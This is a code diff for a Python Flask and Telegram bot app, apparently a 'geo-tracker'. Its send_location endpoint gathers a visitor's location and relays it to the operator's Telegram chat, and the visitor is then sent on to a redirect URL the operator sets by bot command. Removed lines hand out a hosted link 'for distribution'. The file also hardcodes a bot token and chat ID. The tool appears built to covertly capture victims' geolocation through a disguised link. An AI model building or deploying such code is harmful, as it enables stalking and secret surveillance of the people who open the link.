@@ -3,17 +3,13 @@ import requests
 import telebot
 import threading
 import os
-from telebot import types
 
 BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
 CHAT_ID = 651911888
-RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'
 REDIRECT_FILE = 'redirect_url.txt'
 
 app = Flask(__name__)
 bot = telebot.TeleBot(BOT_TOKEN)
-
-user_waiting_for_url = set()
 
 def get_redirect_url():
     try:
@@ -77,30 +73,18 @@ def send_location():
         return {'status': 'ok'}
     return {'status': 'error'}, 400
 
-@bot.message_handler(commands=['start', 'help'])
-def send_welcome(message):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.row('Изменить редирект', 'Скинуть ссылку')
-    bot.send_message(message.chat.id, "Выбери действие:", reply_markup=markup)
-
-@bot.message_handler(func=lambda m: m.text == 'Изменить редирект')
-def ask_redirect(message):
-    bot.send_message(message.chat.id, "Пришли новую ссылку для редиректа (начиная с http:// или https://):")
-    user_waiting_for_url.add(message.chat.id)
-
-@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url)
-def set_redirect_from_message(message):
-    url = message.text.strip()
-    if url.startswith('http://') or url.startswith('https://'):
-        set_redirect_url(url)
-        bot.send_message(message.chat.id, f"✅ Редирект установлен на:\n{url}")
-        user_waiting_for_url.remove(message.chat.id)
+@bot.message_handler(commands=['setredirect'])
+def cmd_setredirect(message):
+    args = message.text.split(maxsplit=1)
+    if len(args) == 2:
+        url = args[1].strip()
+        if url.startswith('http://') or url.startswith('https://'):
+            set_redirect_url(url)
+            bot.reply_to(message, f"✅ Редирект установлен на:\n{url}")
+        else:
+            bot.reply_to(message, "❌ Ошибка: ссылка должна начинаться с http:// или https://")
     else:
-        bot.send_message(message.chat.id, "❌ Ошибка: ссылка должна начинаться с http:// или https://. Попробуй ещё раз.")
-
-@bot.message_handler(func=lambda m: m.text == 'Скинуть ссылку')
-def send_render_link(message):
-    bot.send_message(message.chat.id, f"Вот твоя ссылка для рассылки:\n{RENDER_URL}")
+        bot.reply_to(message, "Использование:\n/setredirect https://example.com")
 
 def run_bot():
     bot.infinity_polling()
